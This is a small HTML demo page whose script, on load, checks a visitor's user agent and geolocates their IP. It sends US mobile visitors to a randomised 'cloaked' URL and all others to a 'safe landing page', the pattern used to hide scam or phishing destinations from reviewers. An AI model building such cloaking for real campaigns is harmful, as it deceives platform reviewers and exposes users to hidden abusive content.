<!DOCTYPE html>
<html>
<head>
	<title>Cloaking Demo</title>
	<script>
		function checkRequest() {
			// Get the user agent string
			var userAgent = navigator.userAgent;

			// Check if the user agent is a mobile device
			if (/Mobi/.test(userAgent)) {
				// Use an IP geolocation API to get the user's country
				fetch('https://ipapi.co/json/')
				.then(response => response.json())
				.then(data => {
					var countryCode = data.country_code;

					// Check if the country is the target country
					if (countryCode === 'US') {
						// Generate a cloaked URL
						var cloakedUrl = 'https://example.com/' + Math.random().toString(36).substring(2, 8);

						// Redirect the user to the cloaked URL
						window.location.href = cloakedUrl;
					} else {
						// Redirect the user to a safe landing page
						window.location.href = 'https://example.com/landing';
					}
				})
				.catch(error => {
					// Handle errors
					console.error(error);
				});
			} else {
				// Redirect the user to a safe landing page
				window.location.href = 'https://example.com/landing';
			}
		}
	</script>
</head>
<body onload="checkRequest()">
	<h1>Cloaking Demo</h1>
	<p>This page will check the IP address country and user agent of an incoming request and redirect the user to a cloaked URL or safe landing page.</p>
</body>
</html>
